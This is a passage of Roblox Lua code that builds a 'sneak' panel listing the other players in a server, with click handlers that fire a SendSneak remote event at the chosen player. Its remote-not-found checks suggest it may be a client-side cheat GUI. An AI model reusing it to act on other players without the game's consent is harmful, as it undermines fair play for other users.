			local d=UIS:GetMouseLocation()-sds; sp.Position=UDim2.new(ssp.X.Scale,ssp.X.Offset+d.X,ssp.Y.Scale,ssp.Y.Offset+d.Y)
		end
	end)

	local statusLbl=Instance.new("TextLabel"); statusLbl.Size=UDim2.new(1,-12,0,20); statusLbl.Position=UDim2.new(0,6,1,-24)
	statusLbl.BackgroundTransparency=1; statusLbl.Text=""; statusLbl.TextColor3=C_ON; statusLbl.TextSize=11
	statusLbl.Font=Enum.Font.Gotham; statusLbl.TextXAlignment=Enum.TextXAlignment.Left; statusLbl.Parent=sp

	local ss2=Instance.new("ScrollingFrame"); ss2.Size=UDim2.new(1,-8,1,-64); ss2.Position=UDim2.new(0,4,0,40)
	ss2.BackgroundTransparency=1; ss2.BorderSizePixel=0; ss2.ScrollBarThickness=3
	ss2.ScrollBarImageColor3=Color3.fromRGB(180,50,110); ss2.CanvasSize=UDim2.new(0,0,0,0); ss2.Parent=sp
	local sl=Instance.new("UIListLayout"); sl.SortOrder=Enum.SortOrder.Name; sl.Padding=UDim.new(0,4); sl.Parent=ss2
	local spd=Instance.new("UIPadding"); spd.PaddingTop=UDim.new(0,4); spd.PaddingLeft=UDim.new(0,2)
	spd.PaddingRight=UDim.new(0,2); spd.Parent=ss2

	local pRows2={}
	local function buildSRow(other)
		if pRows2[other] then return end
		local row=Instance.new("TextButton"); row.Size=UDim2.new(1,-4,0,36)
		row.BackgroundColor3=Color3.fromRGB(74,20,44); row.BorderSizePixel=0
		row.Text=other.DisplayName.."  ("..other.Name..")"; row.TextColor3=Color3.fromRGB(255,200,225)
		row.TextSize=12; row.Font=Enum.Font.Gotham; row.TextXAlignment=Enum.TextXAlignment.Left
		row.Name=other.Name; row.Parent=ss2; Instance.new("UICorner",row).CornerRadius=UDim.new(0,8)
		local rp=Instance.new("UIPadding"); rp.PaddingLeft=UDim.new(0,10); rp.Parent=row
		row.MouseEnter:Connect(function() TweenService:Create(row,TW_ROW,{BackgroundColor3=Color3.fromRGB(120,32,70)}):Play() end)
		row.MouseLeave:Connect(function() TweenService:Create(row,TW_ROW,{BackgroundColor3=Color3.fromRGB(74,20,44)}):Play() end)
		row.MouseButton1Click:Connect(function()
			if not SendSneak then statusLbl.Text="❌ Remote not found"; statusLbl.TextColor3=C_OFF; return end
			local ok,err=pcall(function() SendSneak:FireServer(other) end)
			if ok then statusLbl.Text="✓ Sneaked "..other.DisplayName; statusLbl.TextColor3=C_ON
			else statusLbl.Text="❌ "..tostring(err):sub(1,35); statusLbl.TextColor3=C_OFF end
			TweenService:Create(row,TW_ROW,{BackgroundColor3=Color3.fromRGB(140,30,80)}):Play()
			task.delay(0.8,function() TweenService:Create(row,TW_ROW,{BackgroundColor3=Color3.fromRGB(74,20,44)}):Play() end)
		end)
		pRows2[other]=row
	end
	local function removeSRow(other) if pRows2[other] then pRows2[other]:Destroy(); pRows2[other]=nil end end
	for _,other in ipairs(Players:GetPlayers()) do if other~=player then buildSRow(other) end end
	Players.PlayerAdded:Connect(function(other) if other~=player then buildSRow(other) end end)
	Players.PlayerRemoving:Connect(function(other) removeSRow(other) end)
	sl:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		ss2.CanvasSize=UDim2.new(0,0,0,sl.AbsoluteContentSize.Y+8)
	end)
end

buildSneakPanel()
buildMobileUI()
